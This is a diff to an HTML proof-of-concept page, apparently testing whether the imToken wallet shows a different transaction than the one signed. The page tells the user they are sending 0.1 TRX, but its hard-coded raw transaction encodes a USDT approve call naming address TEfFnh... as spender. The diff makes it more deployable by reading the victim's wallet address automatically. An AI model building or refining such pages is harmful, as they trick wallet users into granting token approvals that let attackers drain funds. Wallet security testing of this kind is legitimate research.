@@ -3,20 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>imToken TRON 测试</title>
+    <title>imToken TRON 所见非所签 测试</title>
     <style>
         body{font-family:system-ui,sans-serif;background:#111;color:#0f0;padding:20px;text-align:center}
         button{padding:18px 40px;font-size:18px;background:#0b8;margin:20px;border:none;border-radius:8px;cursor:pointer}
         .info{margin:15px;padding:15px;background:#222;border-radius:6px}
-        pre{background:#222;padding:10px;border-radius:6px;text-align:left;font-size:12px;overflow:auto}
+        pre{background:#222;padding:10px;border-radius:6px;text-align:left;font-size:12px;overflow:auto;max-height:400px}
     </style>
 </head>
 <body>
-    <h1>imToken TRON 测试页面</h1>
+    <h1>imToken TRON 所见非所签 测试</h1>
     <div class="info">
         点击按钮将显示：<br>
-        发送 0.1 TRX 到 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz<br>
-        <strong>实际可能为 USDT Approve</strong>
+        <strong>发送 0.1 TRX 到 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz</strong><br>
+        实际可能为 USDT Approve（授权地址 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz）
     </div>
     <button onclick="sendTx()">发送 0.1 TRX</button>
 
@@ -24,7 +24,23 @@
 
     <script>
         function log(msg) {
-            document.getElementById('log').textContent += msg + '\n';
+            const logEl = document.getElementById('log');
+            logEl.textContent += msg + '\n';
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        async function getOwnerAddress() {
+            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                return window.tronWeb.defaultAddress.base58;
+            }
+            // 备用方式
+            if (window.tronLink && window.tronLink.request) {
+                try {
+                    const res = await window.tronLink.request({method: 'tron_requestAccounts'});
+                    return res && res[0] ? res[0] : null;
+                } catch(e) {}
+            }
+            return null;
         }
 
         async function sendTx() {
@@ -33,10 +49,16 @@
                 return;
             }
 
-            log("imToken 环境已检测");
+            log("imToken 环境检测成功");
 
-            // 请将下面地址替换成你的 imToken TRON 钱包地址（Base58）
-            const owner = "替换成你的TRON地址";   // ←←← 修改这里
+            const owner = await getOwnerAddress();
+            if (!owner || !owner.startsWith('T')) {
+                alert("无法获取钱包地址，请确保已在 imToken 中连接 TRON 账户");
+                log("获取地址失败");
+                return;
+            }
+
+            log("当前钱包地址: " + owner);
 
             const payload = {
                 "raw_data": {
@@ -53,24 +75,34 @@
                     "ref_block_bytes": "0000",
                     "ref_block_hash": "0000000000000000000000000000000000000000000000000000000000000000",
                     "expiration": Date.now() + 3600000,
-                    "timestamp": Date.now()
+                    "timestamp": Date.now(),
+                    "fee_limit": 100000000
                 },
-                "raw_data_hex": "0a0200002208000000000000000040e0f3d9b3b9b9b95a6a0a31747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e54726967676572536d617274436f6e747261637412350a1541" + owner.substring(2) + "121541a614f803b6fd780986a42c78ec9c7f77e6ded13c2244095ea7b300000000000000000000000000000000000000000000000000000000000000000000"
+                "raw_data_hex": "0a0200002208000000000000000040e0f3d9b3b9b95a6a0a31747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e54726967676572536d617274436f6e747261637412350a1541" + owner.substring(2) + "121541a614f803b6fd780986a42c78ec9c7f77e6ded13c2244095ea7b300000000000000000000000000000000000000000000000000000000000000000000"
             };
 
-            log("准备发送 payload...");
+            log("Payload 已准备，正在调用 sendTransaction...");
             console.log(payload);
 
             try {
                 const result = await window.imToken.callPromisifyAPI("tron.sendTransaction", payload);
-                log("成功提交: " + JSON.stringify(result));
-                alert("交易已提交！请检查确认页显示（TRX转账）与链上实际结果");
+                log("提交成功: " + JSON.stringify(result));
+                alert("交易已提交！\n确认页应显示 TRX 转账\n请在 TronScan 检查链上实际结果");
             } catch(e) {
-                log("错误: " + e.message);
+                log("错误: " + (e.message || JSON.stringify(e)));
                 console.error(e);
-                alert("调用失败: " + e.message);
+                alert("调用失败: " + (e.message || e));
             }
         }
+
+        // 页面加载时检测 TronWeb
+        window.addEventListener('load', () => {
+            if (window.tronWeb) {
+                log("TronWeb 已注入");
+            } else {
+                log("TronWeb 未检测到");
+            }
+        });
     </script>
 </body>
 </html>
